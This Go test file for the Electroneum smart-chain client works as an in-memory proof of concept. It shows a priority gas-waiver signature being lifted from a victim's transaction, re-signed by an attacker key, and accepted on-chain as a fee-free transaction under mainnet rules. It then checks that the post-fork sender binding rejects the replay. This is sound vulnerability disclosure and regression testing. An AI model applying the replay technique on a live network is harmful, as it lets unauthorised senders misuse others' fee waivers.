package core

import (
 "fmt"
 "math"
 "math/big"
 "strings"
 "testing"

 "github.com/electroneum/electroneum-sc/accounts/abi"
 "github.com/electroneum/electroneum-sc/common"
 "github.com/electroneum/electroneum-sc/contracts/prioritytransactors"
 "github.com/electroneum/electroneum-sc/consensus/ethash"
 "github.com/electroneum/electroneum-sc/core/rawdb"
 "github.com/electroneum/electroneum-sc/core/types"
 "github.com/electroneum/electroneum-sc/core/vm"
 "github.com/electroneum/electroneum-sc/crypto"
 "github.com/electroneum/electroneum-sc/params"
)

// Build a synthetic contract that returns exactly one synthetic authorized
// gas-waiver priority public key, using the *real* ETN priority ABI.
// It is deployed only into an in-memory genesis. No live network is accessed.
func independentPriorityFixtureCode(t *testing.T, pub common.PublicKey) []byte {
 t.Helper()
 a,err:=abi.JSON(strings.NewReader(prioritytransactors.ETNPriorityTransactorsInterfaceMetaData.ABI))
 if err!=nil {t.Fatal(err)}
 ret,err:=a.Methods["getTransactors"].Outputs.Pack([]prioritytransactors.ETNPriorityTransactorsInterfaceTransactorMeta{{
  IsGasPriceWaiver:true, PublicKey:fmt.Sprintf("0x%x",pub[:]), Name:"Synthetic waiver holder",
 }})
 if err!=nil {t.Fatalf("ABI packing: %v",err)}
 if len(ret)>math.MaxUint16 {t.Fatal("ABI output too large")}
 // PUSH2 len; PUSH2 offset; PUSH1 0; CODECOPY; PUSH2 len; PUSH1 0; RETURN
 length:=len(ret)
 runtime:=[]byte{0x61,byte(length>>8),byte(length),0x61,0,15,0x60,0,0x39,0x61,byte(length>>8),byte(length),0x60,0,0xf3}
 return append(runtime,ret...)
}

func TestIndependentMainnetPrioritySignatureRebindingFullImport(t *testing.T) {
 cfg := *params.MainnetChainConfig
 if cfg.FutureForkBlock==nil || cfg.FutureForkBlock.Cmp(big.NewInt(math.MaxInt64))!=0 {
  t.Fatal("Mainnet priority-signature fork unexpectedly scheduled; re-evaluate finding")
 }
 if cfg.ChainID.Int64()!=52014 {t.Fatal("mainnet chain id unexpectedly changed")}
 // Substitute only the consensus engine for deterministic in-memory block
 // generation. The fork activation, tx signature and EVM rules are MAINNET.
 cfg.IBFT=nil
 cfg.Ethash=new(params.EthashConfig)
 signer:=types.MakeSigner(&cfg,big.NewInt(1))
 authorizedKey,_:=crypto.GenerateKey()
 victimKey,_:=crypto.GenerateKey()
 attackerKey,_:=crypto.GenerateKey()
 priorityPub:=crypto.ECDSAPubkeyToPublicKey(authorizedKey.PublicKey)
 victim:=crypto.PubkeyToAddress(victimKey.PublicKey)
 attacker:=crypto.PubkeyToAddress(attackerKey.PublicKey)
 recipient:=common.HexToAddress("0x000000000000000000000000000000000000cbcd")
 data:=&types.PriorityTx{
  ChainID:new(big.Int).Set(cfg.ChainID),Nonce:0,
  GasTipCap:big.NewInt(0),GasFeeCap:big.NewInt(0),
  Gas:params.TxGas, To:&recipient,Value:big.NewInt(0),
 }
 genuine,err:=types.SignNewPriorityTx(victimKey,authorizedKey,signer,data)
 if err!=nil {t.Fatal(err)}
 pv,pr,ps:=genuine.RawPrioritySignatureValues()
 unsignedCopy:=&types.PriorityTx{
  ChainID:new(big.Int).Set(cfg.ChainID),Nonce:0,
  GasTipCap:big.NewInt(0),GasFeeCap:big.NewInt(0),
  Gas:params.TxGas,To:&recipient,Value:big.NewInt(0),
  PriorityV:new(big.Int).Set(pv),PriorityR:new(big.Int).Set(pr),PriorityS:new(big.Int).Set(ps),
 }
 forged,err:=types.SignNewTx(attackerKey,signer,unsignedCopy)
 if err!=nil {t.Fatal(err)}
 if forged.Hash()==genuine.Hash(){t.Fatal("sender change did not change transaction hash")}
 recoveredSender,err:=types.Sender(signer,forged)
 if err!=nil||recoveredSender!=attacker {t.Fatalf("forged sender mismatch: %v %s",err,recoveredSender)}
 recoveredPriority,err:=types.PrioritySender(signer,forged)
 if err!=nil||recoveredPriority!=priorityPub {t.Fatalf("unbound priority replay did not succeed: %v",err)}
 t.Logf("ETN_P2_MAINNET_SIGNATURE_REBIND_SUCCESS victim=%s attacker=%s priorityPub=%x",victim,attacker,priorityPub)

 contractCode:=independentPriorityFixtureCode(t,priorityPub)
 db:=rawdb.NewMemoryDatabase()
 g:=&Genesis{Config:&cfg,GasLimit:15000000,
  Alloc:GenesisAlloc{
   victim:{Balance:big.NewInt(0)},
   attacker:{Balance:big.NewInt(0)},
   cfg.PriorityTransactorsContractAddress:{Balance:big.NewInt(0),Code:contractCode},
  },
  BaseFee:big.NewInt(params.InitialBaseFee),
 }
 genesis:=g.MustCommit(db)
 engine:=ethash.NewFaker()
 chain,err:=NewBlockChain(db,nil,&cfg,engine,vm.Config{},nil,nil)
 if err!=nil {t.Fatalf("NewBlockChain: %v",err)}
 defer chain.Stop()

 // Block maker executes the exact ApplyTransaction rules; seed the same
 // contract-derived priority map used by StateProcessor on real import.
 var expectedGas uint64
 blocks,_:=GenerateChain(&cfg,genesis,engine,db,1,func(_ int,b *BlockGen){
  b.statedb.SetPriorityTransactors(common.PriorityTransactorMap{
   priorityPub:{IsGasPriceWaiver:true,EntityName:"Synthetic waiver holder"},
  })
  b.AddTx(forged)
  expectedGas=b.header.GasUsed
 })
 if expectedGas!=params.TxGas {t.Fatalf("unexpected gas consumed %d",expectedGas)}
 if i,err:=chain.InsertChain(blocks);err!=nil {t.Fatalf("import rejected forged fee-free tx index=%d: %v",i,err)}
 if got:=chain.GetCanonicalHash(1);got!=blocks[0].Hash(){t.Fatalf("block not canonical %s",got)}
 state,err:=chain.State()
 if err!=nil {t.Fatal(err)}
 if state.GetNonce(attacker)!=1 {t.Fatalf("unauthorized sender nonce not consumed %d",state.GetNonce(attacker))}
 if state.GetBalance(attacker).Sign()!=0 {t.Fatalf("zero-funded sender balance unexpectedly changed: %v",state.GetBalance(attacker))}
 rcpts:=chain.GetReceiptsByHash(blocks[0].Hash())
 if len(rcpts)!=1||rcpts[0].Status!=types.ReceiptStatusSuccessful {t.Fatalf("forged receipt not successful: %+v",rcpts)}
 t.Logf("ETN_P2_CANONICAL_ZERO_FEE_REPLAY_ACCEPTED chain_id=%d canonical_block=%s attacker_nonce=%d gas_used=%d attacker_balance_wei=%s base_fee_wei=%s priority_owner_is_attacker=false",cfg.ChainID,blocks[0].Hash(),state.GetNonce(attacker),expectedGas,state.GetBalance(attacker),blocks[0].BaseFee())

 // The fork-specific counterexample: same captured signature must NOT
 // recover the original priority public key if sender binding is active.
 boundSigner:=types.NewFutureForkSigner(cfg.ChainID)
 newPub,err:=types.PrioritySender(boundSigner,forged)
 if err==nil&&newPub==priorityPub {t.Fatal("post-fork sender binding not enforced")}
 t.Log("ETN_P2_POSTFORK_COUNTEREXAMPLE_REJECTS_REPLAY")
}
